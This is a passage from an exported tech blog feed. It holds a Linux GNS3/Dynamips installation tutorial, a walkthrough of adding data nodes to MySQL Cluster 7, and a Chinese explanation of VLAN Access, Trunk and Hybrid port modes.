class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line">[user@admin ~]$ su  </span><br><span class="line">Password: (Type in your root password here)  </span><br><span class="line">[root@admin /]# yum install python python-devel xorg-x11-proto-devel libXext-devel  </span><br><span class="line">[root@admin /]# yum install gcc-c++  </span><br><span class="line">Now we&apos;ll download and install Qt4  </span><br><span class="line">[root@admin /]#cd /tmp  </span><br><span class="line">[root@admin tmp#wget http://ftp.uludag.org.tr/pub/source/2009/qt-x11-opensource-src-4.5.1.tar.gz  </span><br><span class="line">[root@admin tmp]#tar xzf qt-x11-opensource-src-4.5.1.tar.gz  </span><br><span class="line">[root@admin tmp]# cd qt-x11-opensource-src-4.5.1  </span><br><span class="line">[root@admin qt-x11-opensource-src-4.5.1]#./configure -nomake examples -nomake demos -qt-gif -no-exceptions -debug -qt3support  </span><br><span class="line">[root@admin qt-x11-opensource-src-4.5.1]#gmake &lt;====This might take 2-3 hrs.  </span><br><span class="line">[root@admin qt-x11-opensource-src-4.5.1]#gmake install &lt;====Another 30 mins or so  </span><br><span class="line">[root@admin qt-x11-opensource-src-4.5.1]#PATH=/usr/local/Trolltech/Qt-4.5.1/bin:$PATH  </span><br><span class="line">[root@admin qt-x11-opensource-src-4.5.1]#export PATH  </span><br><span class="line">Next we&apos;ll install SIP  </span><br><span class="line">[root@admin qt-x11-opensource-src-4.5.1]#cd ..  </span><br><span class="line">[root@admin tmp]#wget http://ftp.uludag.org.tr/pub/source/2009/sip-4.8.1.tar.gz  </span><br><span class="line">[root@admin tmp]#tar xzf sip-4.8.1.tar.gz  </span><br><span class="line">[root@admin tmp]#cd sip-4.8.1  </span><br><span class="line">[root@admin sip-4.8.1]#python configure.py  </span><br><span class="line">[root@admin sip-4.8.1]#make  </span><br><span class="line">[root@admin sip-4.8.1]#make install  </span><br><span class="line">Next we&apos;ll Install PyQt4  </span><br><span class="line">[root@admin sip-4.8.1]#cd ..  </span><br><span class="line">[root@admin tmp]#wget http://ftp.uludag.org.tr/pub/source/2009/PyQt-x11-gpl-4.5.2.tar.gz  </span><br><span class="line">[root@admin tmp]#tar xzf PyQt-x11-gpl-4.5.2.tar.gz  </span><br><span class="line">[root@admin tmp]#cd PyQt-x11-gpl-4.5.2  </span><br><span class="line">[root@admin PyQt-x11-gpl-4.5.2]#python configure.py  </span><br><span class="line">[root@admin PyQt-x11-gpl-4.5.2]#make &lt;=====This will take 30-60 mins  </span><br><span class="line">[root@admin PyQt-x11-gpl-4.5.2]#make install  </span><br><span class="line">We are done with compiling part, now lets download GNS3 source files  </span><br><span class="line">[root@admin tmp]#cd /opt  </span><br><span class="line">[root@admin opt]#wget http://space.dl.sourceforge.net/project/gns-3/GNS3/0.7.2/GNS3-0.7.2-src.tar.bz2  </span><br><span class="line">[root@admin opt]#tar -xjvf GNS3-0.7.2-src.tar.bz2 &amp;&amp; rm GNS3-0.7.2-src.tar.bz2  </span><br><span class="line">[root@admin opt]#mv GNS3-0.7.2-src /opt/GNS3  </span><br><span class="line">Create the following directories:  </span><br><span class="line">These directories will be used by GNS3 – such as projects – where your working projects will be stored, cache, temp, IOS images, etc.  </span><br><span class="line">[root@admin opt]#cd /opt/GNS3  </span><br><span class="line">[root@admin GNS3]#mkdir Dynamips  </span><br><span class="line">[root@admin GNS3]#mkdir IOS  </span><br><span class="line">[root@admin GNS3]#mkdir Project  </span><br><span class="line">[root@admin GNS3]#mkdir Cache  </span><br><span class="line">[root@admin GNS3]#mkdir tmp  </span><br><span class="line">[root@admin GNS3]#chmod o+rw -R ./Project  </span><br><span class="line">[root@admin GNS3]#chmod o+rw -R ./tmp  </span><br><span class="line">[root@admin GNS3]#chmod o+rw -R ./IOS  </span><br><span class="line">Download binary of dynamips and make it executable  </span><br><span class="line">[root@admin GNS3]#cd Dynamips  </span><br><span class="line">[root@admin Dynamips ]#wget http://www.ipflow.utc.fr/dynamips/dynamips-0.2.8-RC2-x86.bin  </span><br><span class="line">[root@admin Dynamips ]#chmod +x ./dynamips-0.2.8-RC2-x86.bin  </span><br><span class="line">IMP:: For 64-bit users  </span><br><span class="line">[root@admin Dynamips ]#wget http://www.ipflow.utc.fr/dynamips/dynamips-0.2.8-RC2-amd64.bin  </span><br><span class="line">[root@admin Dynamips ]#chmod +x ./dynamips-0.2.8-RC2-amd64.bin  </span><br><span class="line">You can create a desktop shortcut by right-clicking on the desktop and select “Create Launcher..”, Name it GNS3 and in the command section type in  </span><br><span class="line">python &quot;/opt/GNS3/gns3&quot;  </span><br><span class="line">Double click to open GNS3 and we will edit the default settings. If you don’t want to use desktop icons you can create a launcher from your programs menu by right clicking on the Main Menu, selecting Edit Menu. Select New Item on the right and you will be presented with the same window where you type in the above. From there you can move the launcher into any menu section of your choice.  </span><br><span class="line">Fire up GNS3  </span><br><span class="line">\* Go to edit | preferences and in the ‘Terminal command:’ section type in:  </span><br><span class="line">gnome-terminal -t %d -e &apos;telnet %h %p&apos; &gt; /dev/null 2&gt;&amp;1 &amp;  </span><br><span class="line">\* Under ‘Paths’ change the ‘Project directory:’ to  </span><br><span class="line">/opt/GNS3/Project  </span><br><span class="line">and the ‘IOS/PIX directory:’ to  </span><br><span class="line">/opt/GNS3/IOS  </span><br><span class="line">\* Click on Dynamips tab on the left  </span><br><span class="line">For the ‘Executable path:’ type in  </span><br><span class="line">/opt/GNS3/Dynamips/dynamips-0.2.8-RC2-x86.bin  </span><br><span class="line">\* Change the ‘Working directory:’ to  </span><br><span class="line">/opt/GNS3/tmp  </span><br><span class="line">Click on the Capture tab on the left  </span><br><span class="line">\* For the ‘Working directory for capture files:’ change it to  </span><br><span class="line">/opt/GNS3/Project  </span><br><span class="line">Imp:: When you want to stop the router, use right click stop on the router.  </span><br><span class="line">After you have done all that, you will be able to Open and Save your GNS3 projects properly and have an efficient setup for GNS3. In order to use the devices in GNS3 you must obtain our own IOS images from Cisco or http://networkingtips-tricks.blogspot.com/2010/03/cisco-ios-collection-for-gns3-and.html  </span><br><span class="line">Hope this tutorial will help you guys to setup and run GNS3 on your Linux system.  </span><br><span class="line">Just the right place to find a schadenfreude  </span><br><span class="line">Happy Learning</span><br></pre></td></tr></table></figure></p>]]></content>
      
      <categories>
          
          <category> 默认分类 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> gns3 </tag>
            
            <tag> how </tag>
            
            <tag> install </tag>
            
            <tag> on </tag>
            
            <tag> to </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>mysql cluster 7 动态增加数据节点配置步骤</title>
      <link href="/2010/12/10/mysql-cluster-7-dynamically-adds-data-node-configuration-steps/"/>
      <url>/2010/12/10/mysql-cluster-7-dynamically-adds-data-node-configuration-steps/</url>
      <content type="html"><![CDATA[<h2 id="Starting-configuration"><a href="#Starting-configuration" class="headerlink" title="Starting configuration."></a>Starting configuration.</h2><p>vi /usr/local/mysql/mysql-cluster/config.ini</p><p>[ndbd default]</p><p>DataMemory =100M</p><p>IndexMemory =100M</p><p>NoOfReplicas = 2</p><p>DataDir = /usr/local/mysql/var/mysql-cluster</p><p>[ndbd]</p><p>Id = 1</p><p>HostName = 172.20.86.188</p><p>[ndbd]</p><p>Id = 2</p><p>HostName = 172.20.86.189</p><p>[mgm]</p><p>HostName = 172.20.86.185</p><p>Id = 10</p><p>[mysqld]</p><p>Id=20</p><p>HostName = 172.20.86.185</p><p>2在185上运行ndb_mgm</p><p>Ndb_mgm&gt;show</p><p>-- NDB Cluster – Management Client –</p><p>ndb_mgm&gt;<code>**SHOW**</code></p><p>Connected to Management <strong>Server</strong> at: 172.20.86.185:1186</p><p>Cluster Configuration</p><p>---------------------</p><p>[ndbd(NDB)]2 node(s)</p><p><a href="mailto:id=1@172.20.86.188" target="_blank" rel="noopener">id=1@172.20.86.188</a>(5.1.32-ndb-7.0.5, Nodegroup: 0, Master)</p><p><a href="mailto:id=2@172.20.86.189" target="_blank" rel="noopener">id=2@172.20.86.189</a>(5.1.32-ndb-7.0.5, Nodegroup: 0)</p><p>[ndb_mgmd(MGM)] 1 node(s)</p><p><a href="mailto:id=10@172.20.86.185" target="_blank" rel="noopener">id=10@172.20.86.185</a>(5.1.32-ndb-7.0.5)</p><p>[mysqld(API)]2 node(s)</p><p><a href="mailto:id=20@172.20.86.185" target="_blank" rel="noopener">id=20@172.20.86.185</a>(5.1.32-ndb-7.0.5)</p><h2 id="Step-1-Update-configuration-file"><a href="#Step-1-Update-configuration-file" class="headerlink" title="Step 1: Update configuration file"></a>Step 1: Update configuration file</h2><p>[ndbd default]</p><p>DataMemory =100M</p><p>IndexMemory =100M</p><p>NoOfReplicas = 2</p><p>DataDir = /usr/local/mysql/var/mysql-cluster</p><p>[ndbd]</p><p>Id = 1</p><p>HostName = 172.20.86.188</p><p>[ndbd]</p><p>Id = 2</p><p>HostName = 172.20.86.189</p><p><strong>[ndbd]</strong></p><p><strong>Id = 3</strong></p><p><strong>HostName**</strong>=<strong>**172.20.86.187</strong></p><p><strong>[ndbd]</strong></p><p><strong>Id = 4</strong></p><p><strong>HostName**</strong>=<strong>**172.20.86.186</strong></p><p>[mgm]</p><p>HostName = 172.20.86.185</p><p>Id = 10</p><p>[mysqld]</p><p>Id=20</p><p>HostName = 172.20.86.185</p><h2 id="Step-2-Restart-the-management-server"><a href="#Step-2-Restart-the-management-server" class="headerlink" title="Step 2: Restart the management server"></a>Step 2: Restart the management server</h2><h3 id="Step-2-1停止管理节点"><a href="#Step-2-1停止管理节点" class="headerlink" title="Step 2.1停止管理节点"></a>Step 2.1停止<strong>管理</strong>节点</h3><p>ndb_mgm&gt;<code>**10 STOP**</code></p><p>Node 10 has shut down.</p><p>Disconnecting to allow Management Server to shutdown</p><p>shell&gt;</p><h3 id="Step-2-2重新加载配置文件"><a href="#Step-2-2重新加载配置文件" class="headerlink" title="Step 2.2重新加载配置文件"></a>Step 2.2重新加载配置文件</h3><p>shell&gt;<code>**ndb_mgmd -f config.ini --reload**</code></p><p>2008-12-08 17:29:23 [MgmSrvr] INFO-- NDB Cluster Management Server.5.1.34-ndb-7.0.7</p><p>2008-12-08 17:29:23 [MgmSrvr] INFO–Readingcluster configuration from ‘config.ini’</p><h3 id="Step-2-3查看新集群状态"><a href="#Step-2-3查看新集群状态" class="headerlink" title="Step 2.3查看新集群状态"></a>Step 2.3查看新集群状态</h3><p>-- NDB Cluster – Management Client –</p><p>ndb_mgm&gt;<code>**SHOW**</code></p><p>Connected to Management Server at: 172.20.86.185:1186</p><p>Cluster Configuration</p><p>---------------------</p><p>[ndbd(NDB)]2 node(s)</p><p><a href="mailto:id=1@172.20.86.188" target="_blank" rel="noopener">id=1@172.20.86.188</a>(5.1.32-ndb-7.0.5, Nodegroup: 0, Master)</p><p><a href="mailto:id=2@172.20.86.189" target="_blank" rel="noopener">id=2@172.20.86.189</a>(5.1.32-ndb-7.0.5, Nodegroup: 0)</p><p>id=3 (not connected, accepting connect from 172.20.86.186)</p><p>id=4 (not connected, accepting connect from 172.20.86.187)</p><p>[ndb_mgmd(MGM)] 1 node(s)</p><p>id=10 @172.20.86.185(5.1.32-ndb-7.0.5)</p><p>[mysqld(API)]1 node(s)</p><p><a href="mailto:id=20@172.20.86.185" target="_blank" rel="noopener">id=20@172.20.86.185</a> (5.1.32-ndb-7.0.5)</p><h2 id="Step-3-Perform-a-rolling-restart-of-the-existing-data-nodes-–轮流重新启动连接的数据节点"><a href="#Step-3-Perform-a-rolling-restart-of-the-existing-data-nodes-–轮流重新启动连接的数据节点" class="headerlink" title="Step 3: Perform. a rolling restart of the existing data nodes –轮流重新启动连接的数据节点"></a>Step 3: Perform. a rolling restart of the existing <strong>data</strong> nodes –轮流重新启动连接的数据节点</h2><p>ndb_mgm&gt;<code>**1 RESTART**</code></p><p>Node 1: Node shutdown initiated</p><p>Node 1: Node shutdown completed, restarting, no start.</p><p>Node 1 is being restarted</p><p>ndb_mgm&gt; Node 1: Start initiated (version7.0.5)</p><p>Node 1: Started (version7.0.5)</p><p>ndb_mgm&gt;<code>**2 RESTART**</code></p><p>Node 2: Node shutdown initiated</p><p>Node 2: Node shutdown completed, restarting, no start.</p><p>Node 2 is being restarted</p><h2 id="Step-4-Perform-a-rolling-restart-of-all-cluster-API-nodes-–轮流重启sql节点"><a href="#Step-4-Perform-a-rolling-restart-of-all-cluster-API-nodes-–轮流重启sql节点" class="headerlink" title="Step 4: Perform. a rolling restart of all cluster API nodes –轮流重启sql节点"></a>Step 4: Perform. a rolling restart of all cluster API nodes –轮流重启<strong>sql</strong>节点</h2><p>本案仅有一个sql节点</p><p>shell&gt;<code>mysqladmin -uroot -p_password_shutdown</code></p><p>shell&gt;<code>mysqld_safe &amp;</code></p><h2 id="Step-5-Perform-an-initial-start-of-the-new-data-nodes-–初始化新的数据节点"><a href="#Step-5-Perform-an-initial-start-of-the-new-data-nodes-–初始化新的数据节点" class="headerlink" title="Step 5: Perform. an initial start of the new data nodes –初始化新的数据节点"></a>Step 5: Perform. an initial start of the new data nodes –初始化新的数据节点</h2><p>在新增的数据节点上186和187上执行</p><p>Shell&gt;ndbmtd –initial</p><p>或者</p><p>Shell&gt;ndbd –initial</p><p>登陆管理节点查看集群状态</p><p>Connected to Management Server at: 172.20.86.185:1186</p><p>Cluster Configuration</p><p>---------------------</p><p>[ndbd(NDB)]2 node(s)</p><p><a href="mailto:id=1@172.20.86.188" target="_blank" rel="noopener">id=1@172.20.86.188</a>(5.1.32-ndb-7.0.5, Nodegroup: 0, Master)</p><p><a href="mailto:id=2@172.20.86.189" target="_blank" rel="noopener">id=2@172.20.86.189</a>(5.1.32-ndb-7.0.5, Nodegroup: 0)</p><p><a href="mailto:id=3@172.20.86.186" target="_blank" rel="noopener">id=3@172.20.86.186</a>(5.1.32-ndb-7.0.5,<strong>no nodegroup</strong>)</p><p><a href="mailto:id=4@172.20.86.187" target="_blank" rel="noopener">id=4@172.20.86.187</a>(5.1.32-ndb-7.0.5,<strong>no nodegroup</strong>)</p><p>[ndb_mgmd(MGM)] 1 node(s)</p><p><a href="mailto:id=10@172.20.86.185" target="_blank" rel="noopener">id=10@172.20.86.185</a>(5.1.32-ndb-7.0.5)</p><p>[mysqld(API)]2 node(s)</p><p><a href="mailto:id=20@172.20.86.185" target="_blank" rel="noopener">id=20@172.20.86.185</a> (5.1.32-ndb-7.0.5)</p><h2 id="Step-6-Create-a-new-node-group"><a href="#Step-6-Create-a-new-node-group" class="headerlink" title="Step 6: Create a new node group."></a>Step 6: Create a new node group.</h2><p>ndb_mgm&gt;<code>**CREATE NODEGROUP 3,4**</code></p><p>Nodegroup 1 created</p><p>ndb_mgm&gt;<code>**SHOW**</code></p><p>Connected to Management Server at: 172.20.86.185:1186</p><p>Cluster Configuration</p><p>---------------------</p><p>[ndbd(NDB)]2 node(s)</p><p><a href="mailto:id=1@172.20.86.188" target="_blank" rel="noopener">id=1@172.20.86.188</a>(5.1.32-ndb-7.0.5, Nodegroup: 0, Master)</p><p><a href="mailto:id=2@172.20.86.189" target="_blank" rel="noopener">id=2@172.20.86.189</a>(5.1.32-ndb-7.0.5, Nodegroup: 0)</p><p><a href="mailto:id=3@172.20.86.186" target="_blank" rel="noopener">id=3@172.20.86.186</a> (5.1.32-ndb-7.0.5,<strong>Nodegroup: 1</strong>)</p><p><a href="mailto:id=4@172.20.86.187" target="_blank" rel="noopener">id=4@172.20.86.187</a> (5.1.32-ndb-7.0.5,<strong>Nodegroup: 1</strong>)</p><p>[ndb_mgmd(MGM)] 1 node(s)</p><p><a href="mailto:id=10@172.20.86.185" target="_blank" rel="noopener">id=10@172.20.86.185</a> (5.1.32-ndb-7.0.5)</p><p>[mysqld(API)]1 node(s)</p><p><a href="mailto:id=20@172.20.86.185" target="_blank" rel="noopener">id=20@172.20.86.185</a> (5.1.32-ndb-7.0.5)</p><h2 id="Step-7-Redistribute-cluster-data-–数据的重新分配"><a href="#Step-7-Redistribute-cluster-data-–数据的重新分配" class="headerlink" title="Step 7: Redistribute cluster data. –数据的重新分配"></a>Step 7: Redistribute cluster data. –数据的重新分配</h2><p>对于新增的数据节点一些访问量较高的数据和比较重要的数据需要从新分配。</p><p>分发数据命令：</p><p>Alter online table ips reorganize partition;</p><p>查看数据的分配情况：</p><p>ndb_mgm&gt;<code>**ALL REPORT MEMORY**</code></p><p>Node 1: Data usage is 5%(177 32K pages of total 3200)</p><p>Node 1: Index usage is 0%(108 8K pages of total 12832)</p><p>Node 2: Data usage is 5%(177 32K pages of total 3200)</p><p>Node 2: Index usage is 0%(108 8K pages of total 12832)</p><p><strong>Node 3: Data usage is 0%(0 32K pages of total 3200)</strong></p><p><strong><strong>Node 3: Index usage is 0%(0 8K pages of total 12832)</strong></strong></p><p><strong><strong>Node 4: Data usage is 0%(0 32K pages of total 3200)</strong></strong></p><p><strong><strong>Node 4: Index usage is 0%(0 8K pages of total 12832)</strong></strong></p><p><strong>或者</strong></p><p><strong>shell&gt;`</strong>ndb_desc -c 192.168.0.10 -d n ips -p<strong>`</strong></p><p><strong>-- ips –</strong></p><p><strong>Version: 1</strong></p><p><strong>Fragment type: 9</strong></p><p><strong>K Value: 6</strong></p><p><strong>Min load factor: 78</strong></p><p><strong>Max load factor: 80</strong></p><p><strong>Temporary table: no</strong></p><p><strong>Number of attributes: 6</strong></p><p><strong>Number of primary keys: 1</strong></p><p><strong>Length of frm data: 340</strong></p><p><strong>Row Checksum: 1</strong></p><p><strong>Row GCI: 1</strong></p><p><strong>SingleUserMode: 0</strong></p><p><strong>ForceVarPart: 1</strong></p><p><strong>FragmentCount: 2</strong></p><p><strong>TableStatus: Retrieved</strong></p><p><strong>-- Attributes –</strong></p><p><strong>id Bigint PRIMARY KEY DISTRIBUTION KEY AT=FIXED ST=MEMORY AUTO_INCR</strong></p><p><strong>country_code Char(2;latin1_swedish_ci) NOT NULL AT=FIXED ST=MEMORY</strong></p><p><strong>type Char(4;latin1_swedish_ci) NOT NULL AT=FIXED ST=MEMORY</strong></p><p><strong>ip_address Varchar(15;latin1_swedish_ci) NOT NULL AT=SHORT_VAR ST=MEMORY</strong></p><p><strong>addresses Bigunsigned NULL AT=FIXED ST=MEMORY</strong></p><p><strong>date Bigunsigned NULL AT=FIXED ST=MEMORY</strong></p><p><strong>-- Indexes –</strong></p><p><strong>PRIMARY KEY(id) - UniqueHashIndex</strong></p><p><strong>PRIMARY(id) - OrderedIndex</strong></p><p><strong><strong>-- Per partition info –</strong></strong></p><p><strong><strong>PartitionRow countCommit countFrag fixed memoryFrag varsized memory</strong></strong></p><p><strong><strong>026086260861572864557056</strong></strong></p><p><strong><strong>126329263291605632557056</strong></strong></p><p><strong>NDBT_ProgramExit: 0 - OK</strong></p><p><strong>You can cause the data to be redistributed among all of the data nodes by performing, for each<code>NDBCLUSTER</code>table, an<code>ALTER ONLINE TABLE ... REORGANIZE PARTITION</code>statement in the<a href="http://dev.mysql.com/doc/refman/5.1/en/mysql.html" title="4.5.1. mysql — The MySQL Command-Line Tool" target="_blank" rel="noopener"></a></strong>mysql<strong>client. After issuing the statement<code>ALTER ONLINE TABLE ips REORGANIZE PARTITION</code>, you can see using</strong>ndb_desc<strong>that the data for this table is now stored using 4 partitions, as shown here (with the relevant portions of the output in bold type):</strong></p><p><strong>shell&gt;`</strong>ndb_desc -c 172.20.86.185 -d n ips -p<strong>`</strong></p><p><strong>-- ips –</strong></p><p><strong>Version: 16777217</strong></p><p><strong>Fragment type: 9</strong></p><p><strong>K Value: 6</strong></p><p><strong>Min load factor: 78</strong></p><p><strong>Max load factor: 80</strong></p><p><strong>Temporary table: no</strong></p><p><strong>Number of attributes: 6</strong></p><p><strong>Number of primary keys: 1</strong></p><p><strong>Length of frm data: 341</strong></p><p><strong>Row Checksum: 1</strong></p><p><strong>Row GCI: 1</strong></p><p><strong>SingleUserMode: 0</strong></p><p><strong>ForceVarPart: 1</strong></p><p><strong>FragmentCount: 4</strong></p><p><strong>TableStatus: Retrieved</strong></p><p><strong>-- Attributes –</strong></p><p><strong>id Bigint PRIMARY KEY DISTRIBUTION KEY AT=FIXED ST=MEMORY AUTO_INCR</strong></p><p><strong>country_code Char(2;latin1_swedish_ci) NOT NULL AT=FIXED ST=MEMORY</strong></p><p><strong>type Char(4;latin1_swedish_ci) NOT NULL AT=FIXED ST=MEMORY</strong></p><p><strong>ip_address Varchar(15;latin1_swedish_ci) NOT NULL AT=SHORT_VAR ST=MEMORY</strong></p><p><strong>addresses Bigunsigned NULL AT=FIXED ST=MEMORY</strong></p><p><strong>date Bigunsigned NULL AT=FIXED ST=MEMORY</strong></p><p><strong>-- Indexes –</strong></p><p><strong>PRIMARY KEY(id) - UniqueHashIndex</strong></p><p><strong>PRIMARY(id) - OrderedIndex</strong></p><p><strong><strong>-- Per partition info –</strong></strong></p><p><strong><strong>PartitionRow countCommit countFrag fixed memoryFrag varsized memory</strong></strong></p><p><strong><strong>012981522961572864557056</strong></strong></p><p><strong><strong>113236525151605632557056</strong></strong></p><p><strong><strong>21310513105819200294912</strong></strong></p><p><strong><strong>31309313093819200294912</strong></strong></p>]]></content>
      
      <categories>
          
          <category> 默认分类 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 7 </tag>
            
            <tag> cluster </tag>
            
            <tag> mysql </tag>
            
            <tag> 动态增加数据节点配置步骤 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Access、Hybrid和Trunk三种模式的理解</title>
      <link href="/2010/12/10/understanding-of-the-three-modes-of-access-hybrid-and-trunk/"/>
      <url>/2010/12/10/understanding-of-the-three-modes-of-access-hybrid-and-trunk/</url>
      <content type="html"><![CDATA[<p>Tag，untag以及交换机的各种端口模式是网络工程技术人员调试交换机时接触最多的概念了，然而笔者发现在实际工作中技术人员往往对这些概念似懂非懂，笔者根据自己的理解再结合一个案例，试图向大家阐明这些概念  </p><p>untag就是普通的ethernet报文，普通PC机的网卡是可以识别这样的报文进行通讯；<br>tag报文结构的变化是在源mac地址和目的mac地址之后，加上了4bytes的vlan信息，也就是vlan tag头；一般来说这样的报文普通PC机的网卡是不能识别的  </p><p>下图说明了802.1Q封装tag报文帧结构  </p><p>带802.1Q的帧是在标准以太网帧上插入了4个字节的标识。其中包含：<br>2个字节的协议标识符（TPID)，当前置0x8100的固定值，表明该帧带有802.1Q的标记信息。<br>2个字节的标记控制信息（TCI），包含了三个域。<br>Priority域，占3bits，表示报文的优先级，取值0到7，7为最高优先级，0为最低优先级。该域被802.1p采用。<br>规范格式指示符（CFI)域，占1bit，0表示规范格式，应用于以太网；1表示非规范格式，应用于Token Ring。<br>VLAN ID域，占12bit，用于标示VLAN的归属。  </p><p>以太网端口有三种链路类型：Access、Hybrid和Trunk。<br>Access类型的端口只能属于1个VLAN，一般用于连接计算机的端口；<br>Trunk类型的端口可以允许多个VLAN通过，可以接收和发送多个VLAN的报文，一般用于交换机之间连接的端口；<br>Hybrid类型的端口可以允许多个VLAN通过，可以接收和发送多个VLAN的报文，可以用于交换机之间连接，也可以用于连接用户的计算机。<br>Hybrid端口和Trunk端口在接收数据时，处理方法是一样的，唯一不同之处在于发送数据时：Hybrid端口可以允许多个VLAN的报文发送时不打标签，而Trunk端口只允许缺省VLAN的报文发送时不打标签。  </p><p>在这里先要向大家阐明端口的缺省VLAN这个概念<br>Access端口只属于1个VLAN，所以它的缺省VLAN就是它所在的VLAN，不用设置；<br>Hybrid端口和Trunk端口属于多个VLAN，所以需要设置缺省VLAN ID。缺省情况下，Hybrid端口和Trunk端口的缺省VLAN为VLAN 1<br>如果设置了端口的缺省VLAN ID，当端口接收到不带VLAN Tag的报文后，则将报文转发到属于缺省VLAN的端口；当端口发送带有VLAN Tag的报文时，如果该报文的VLAN ID与端口缺省的VLAN ID相同，则系统将去掉报文的VLAN Tag，然后再发送该报文。<br>注：对于华为交换机缺省VLAN被称为“Pvid Vlan”， 对于思科交换机缺省VLAN被称为“Native Vlan”  </p><p>交换机接口出入数据处理过程如下：  </p><p>Acess端口收报文:<br>收到一个报文,判断是否有VLAN信息：如果没有则打上端口的PVID，并进行交换转发,如果有则直接丢弃（缺省）  </p><p>Acess端口发报文：<br>将报文的VLAN信息剥离，直接发送出去  </p><p>trunk端口收报文：<br>收到一个报文，判断是否有VLAN信息：如果没有则打上端口的PVID，并进行交换转发，如果有判断该trunk端口是否允许该 VLAN的数据进入：如果可以则转发，否则丢弃  </p><p>trunk端口发报文：<br>比较端口的PVID和将要发送报文的VLAN信息，如果两者相等则剥离VLAN信息，再发送，如果不相等则直接发送  </p><p>hybrid端口收报文：<br>收到一个报文,判断是否有VLAN信息：如果没有则打上端口的PVID，并进行交换转发，如果有则判断该hybrid端口是否允许该VLAN的数据进入：如果可以则转发，否则丢弃(此时端口上的untag配置是不用考虑的，untag配置只对发送报文时起作用)  </p><p>hybrid端口发报文：<br>1、判断该VLAN在本端口的属性（disp interface 即可看到该端口对哪些VLAN是untag， 哪些VLAN是tag）<br>2、如果是untag则剥离VLAN信息，再发送，如果是tag则直接发送  </p><p>以下案例可以帮助大家深入理解华为交换机的hybrid端口模式<br>[Switch-Ethernet0/1]int e0/1<br>[Switch-Ethernet0/1]port link-type hybrid<br>[Switch-Ethernet0/1]port hybrid pvid vlan 10<br>[Switch-Ethernet0/1]port hybrid vlan 10 20 untagged<br>[Switch-Ethernet0/1] int e0/2<br>[Switch-Ethernet0/2]port link-type hybrid<br>[Switch-Ethernet0/2]port hybrid pvid vlan 20<br>[Switch-Ethernet0/2]port hybrid vlan 10 20 untagged<br>此时inter e0/1和inter e0/2下的所接的PC是可以互通的，但互通时数据所走的往返vlan是不同的。<br>以下以inter e0/1下的所接的pc1访问inter e0/2下的所接的pc2为例进行说明  </p><p>pc1所发出的数据，由inter0/1所在的pvid vlan10封装vlan10的标记后送入交换机，交换机发现inter e0/2允许vlan 10的数据通过，于是数据被转发到inter e0/2上，由于inter e0/2上vlan 10是untagged的，于是交换机此时去除数据包上vlan10的标记，以普通包的形式发给pc2，此时pc1-&gt;p2走的是vlan10  </p><p>再来分析pc2给pc1回包的过程，pc2所发出的数据，由inter0/2所在的pvid vlan20封装vlan20的标记后送入交换机，交换机发现inter e0/1允许vlan 20的数据通过，于是数据被转发到inter e0/1上，由于inter e0/1上vlan 20是untagged的，于是交换机此时去除数据包上vlan20的标记，以普通包的形式发给pc1，此时pc2-&gt;pc1走的是vlan20  </p><p>＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝  </p><p>综上所述，以下列举 Switch收发 Switch对标记的处理 remark<br>Access (接收) Tagged = PVID 不接收 注：部分高端产品可能接收。<br>Access (接收) Tagged =/ PVID 不接收 注：部分高端产品可能接收。<br>Access (接收) Untagged 接收 增加tag＝PVID 从PC  </p><p>Access (发送) Tagged = PVID 转发 删除tag<br>Access (发送) Tagged =/ PVID 不转发 不处理<br>Access (发送) Untagged 无此情况 无此情况 无此情况  </p><p>Trunk (接收) Tagged = PVID 接收 不修改tag<br>Trunk (接收) Tagged =/ PVID 接收 不修改tag<br>Trunk (接收) Untagged 接收 增加tag＝PVID<br>Trunk (发送) Tagged = PVID If Passing then 转发 删除tag<br>Trunk (发送) Tagged =/ PVID If Passing then 转发 不修改tag<br>Trunk (发送) Untagged 无此情况 无此情况 无此情况（注）  </p><p>Hybrid (接收) Tagged = PVID 接收 不修改tag 对端是trunk<br>Hybrid (接收) Tagged =/ PVID 接收 不修改tag 对端是trunk<br>Hybrid (接收) Untagged 接收 增加tag＝PVID 类Trunk<br>Hybrid (发送) Tagged = PVID Tag 和 untag 中列出的vlan可以passing 看Tag项和untag项<br>Hybrid (发送) Tagged =/ PVID Tag 和 untag 中列出的vlan可以passing 看Tag项和untag项<br>Hybrid (发送) Untagged 无此情况 无此情况 无此情况（注）  </p><p>另外需要注意的是：  </p><p>（1）Trunk端口不能和isolate-user-vlan同时配置；Hybrid端口可以和isolate-user-vlan同时配置。但如果缺 省VLAN是在isolate-user-vlan中建立了映射的VLAN，则不允许修改缺省VLAN ID，只有在解除映射后才能进行修改。  </p><p>（2） 本Hybrid端口或Trunk端口的缺省VLAN ID和相连的对端交换机的Hybrid端口或Trunk端口的缺省VLAN 